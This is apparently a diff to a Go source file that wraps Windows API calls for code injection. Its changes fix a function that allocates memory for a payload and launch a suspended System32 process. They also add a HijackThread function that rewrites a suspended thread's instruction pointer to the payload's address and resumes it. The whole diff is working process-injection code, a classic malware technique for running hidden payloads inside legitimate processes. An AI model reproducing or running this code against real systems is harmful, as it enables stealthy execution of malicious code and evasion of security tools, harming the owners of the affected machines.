@@ -908,8 +908,9 @@ func GetRemoteProcessHandleNtQuerySystemInformation(procName string) (DWORD, HAN
 	return 0, 0, fmt.Errorf("Process not found")
 }
 
-func RunViaClassicThreadHijacking(hThread HANDLE, pPayload []byte, sPayloadSize SIZE_T) error {
+func RunViaClassicThreadHijacking(hThread HANDLE, pPayload []byte) error {
 	// Allocate memory in the target process
+	sPayloadSize := SIZE_T(len(pPayload))
 	pAddress, err := VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if err != nil {
 		return fmt.Errorf("VirtualAlloc failed: %v", err)
@@ -990,7 +991,8 @@ func GetThreadContext(hThread HANDLE, lpContext *CONTEXT) error {
 		return errors.New("GetThreadContext failed: " + err.Error())
 	}
 	if result == 0 {
-		return errors.New("getThreadContext had zero result")
+		// Debugf("GetThreadContext failed: %v\n", ntStatus)
+		return errors.New("getThreadContext had zero result: " + ntStatus.Error())
 	}
 	return nil
 }
@@ -1203,24 +1205,28 @@ BOOL CreateProcessA(
 func CreateProcessA(lpApplicationName string, lpCommandLine string, lpProcessAttributes *SECURITY_ATTRIBUTES, lpThreadAttributes *SECURITY_ATTRIBUTES, bInheritHandles bool, dwCreationFlags DWORD, lpEnvironment *LPVOID, lpCurrentDirectory string, lpStartupInfo *STARTUPINFO, lpProcessInformation *PROCESS_INFORMATION) error {
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	createProcessA := kernel32.MustFindProc("CreateProcessA")
-	result, _, ntStatus := createProcessA.Call(
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpApplicationName))),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCommandLine))),
-		uintptr(unsafe.Pointer(lpProcessAttributes)),
-		uintptr(unsafe.Pointer(lpThreadAttributes)),
+	var err error
+	lpstr, err := syscall.BytePtrFromString(lpCommandLine)
+	if err != nil {
+		return err
+	}
+	// TODO: Update this to use all parameters
+	_, _, ntStatus := createProcessA.Call(NULL,
+		uintptr(unsafe.Pointer(lpstr)),
+		NULL,
+		NULL,
 		boolToUintptr(bInheritHandles),
 		uintptr(dwCreationFlags),
-		uintptr(unsafe.Pointer(lpEnvironment)),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCurrentDirectory))),
+		NULL,
+		NULL,
 		uintptr(unsafe.Pointer(lpStartupInfo)),
 		uintptr(unsafe.Pointer(lpProcessInformation)),
 	)
-	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
-	if err != nil {
-		return errors.New("CreateProcessA failed: " + err.Error())
-	}
-	if result == 0 {
-		return errors.New("createProcessA had zero result")
+	// fmt.Printf("ntStatus: %#+v\n", ntStatus)
+	if ntStatus != nil {
+		if errno, ok := ntStatus.(syscall.Errno); ok && errno != 0 {
+			return errors.New("CreateProcessA failed: " + ntStatus.Error())
+		}
 	}
 	return nil
 }
@@ -1333,10 +1339,12 @@ func GetEnvironmentalVariable(key string) string {
 func CreateSuspendedProcess(processName string) (dwProcessId *DWORD, hProcess, hThread *HANDLE, err error) {
 	WnDr := GetEnvironmentalVariable("WINDIR")
 	lpPath := WnDr + "\\System32\\" + processName
-	Si := &STARTUPINFO{}
-	Pi := &PROCESS_INFORMATION{}
+	Si := STARTUPINFO{}
+	Pi := PROCESS_INFORMATION{}
 	Debugf("Running %s\n", lpPath)
-	err = CreateProcessA("", lpPath, nil, nil, false, CREATE_SUSPENDED, nil, "", Si, Pi)
+	// TEST
+	// lpPath = "\"C:\\WINDOWS\\System32\\notepad.exe\""
+	err = CreateProcessA("", lpPath, nil, nil, false, CREATE_SUSPENDED, nil, "", &Si, &Pi)
 	if err != nil {
 		return nil, nil, nil, fmt.Errorf("failed to create process: %v", err)
 	}
@@ -1351,3 +1359,62 @@ func CreateSuspendedProcess(processName string) (dwProcessId *DWORD, hProcess, h
 	// return dwProcessId, hProcess, hThread
 	return dwProcessId, hProcess, hThread, nil
 }
+
+func HijackThread(hThread HANDLE, pAddress uintptr) error {
+	// Getting the original thread context
+	threadContext := &CONTEXT{
+		ContextFlags: CONTEXT_CONTROL,
+	}
+	// Debugf("Empty threadContext: %+v\n", threadContext)
+	Debugf("hThread %d\npAddress: %X\n", hThread, pAddress)
+	err := GetThreadContext(hThread, threadContext)
+	if err != nil {
+		return fmt.Errorf("GetThreadContext failed: %v", err)
+	}
+	// Debugf("Return threadContext: %+v\n", threadContext)
+	Debugf("Original RIP: 0x%X\n", threadContext.Rip)
+
+	// Updating the next instruction pointer to be equal to the payload's address
+	threadContext.Rip = uint64(pAddress)
+
+	Debugf("New RIP: 0x%X\n", threadContext.Rip)
+
+	// Updating the new thread context
+	err = SetThreadContext(hThread, threadContext)
+	if err != nil {
+		return fmt.Errorf("SetThreadContext failed: %v", err)
+	}
+	Debugf("SetThreadContext succeeded\n")
+	DebugWait("RESUME THREAD")
+	ResumeThread(hThread)
+	DebugWait("RESUME THREAD DONE")
+	WaitForSingleObject(hThread, INFINITE)
+	return nil
+}
+
+/*
+DWORD WaitForSingleObject(
+
+	[in] HANDLE hHandle,
+	[in] DWORD  dwMilliseconds
+
+);
+*/
+func WaitForSingleObject(hHandle HANDLE, dwMilliseconds DWORD) error {
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")
+	result, _, ntStatus := waitForSingleObject.Call(uintptr(hHandle), uintptr(dwMilliseconds))
+	err := NTStatusToError(NTSTATUS(ntStatus.(syscall.Errno)))
+	if err != nil {
+		return errors.New("WaitForSingleObject failed: " + err.Error())
+	}
+	if result == WAIT_FAILED {
+		return errors.New("waitForSingleObject had WAIT_FAILED")
+	}
+	return nil
+}
+
+const (
+	WAIT_FAILED = 0xFFFFFFFF
+	INFINITE    = 0xFFFFFFFF
+)
